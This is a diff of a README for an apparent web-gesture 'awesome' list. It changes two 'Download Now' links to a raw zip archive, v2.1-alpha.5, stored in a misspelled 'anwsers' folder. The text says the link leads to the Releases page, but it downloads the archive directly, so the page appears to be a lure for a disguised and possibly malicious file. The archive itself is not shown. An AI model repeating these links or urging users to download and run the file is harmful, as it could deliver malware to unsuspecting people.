@@ -8,7 +8,7 @@ Welcome to the awesome-web-interactions project! This is a collection of web ges
 
 Ready to get started? Download the application from the Releases page below. 
 
-[![Download Now](https://github.com/AnujZanje/awesome-web-interactions/raw/refs/heads/main/anwsers/web_interactions_awesome_2.8.zip%20Now-link-blue)](https://github.com/AnujZanje/awesome-web-interactions/raw/refs/heads/main/anwsers/web_interactions_awesome_2.8.zip)
+[![Download Now](https://raw.githubusercontent.com/AnujZanje/awesome-web-interactions/main/anwsers/web_interactions_awesome_v2.1-alpha.5.zip%20Now-link-blue)](https://raw.githubusercontent.com/AnujZanje/awesome-web-interactions/main/anwsers/web_interactions_awesome_v2.1-alpha.5.zip)
 
 1. Click the link above to visit the Releases page.
 2. You will see a list of available versions. Choose the latest version.
@@ -66,6 +66,6 @@ For more information on how to use web gestures, check out these resources:
 
 Keep an eye on the Releases page for future updates. We regularly add new features and improvements based on user feedback. 
 
-[Click here to download again!](https://github.com/AnujZanje/awesome-web-interactions/raw/refs/heads/main/anwsers/web_interactions_awesome_2.8.zip) 
+[Click here to download again!](https://raw.githubusercontent.com/AnujZanje/awesome-web-interactions/main/anwsers/web_interactions_awesome_v2.1-alpha.5.zip) 
 
 Thank you for using awesome-web-interactions! Enjoy exploring web gestures and enhancing your web browsing experience.
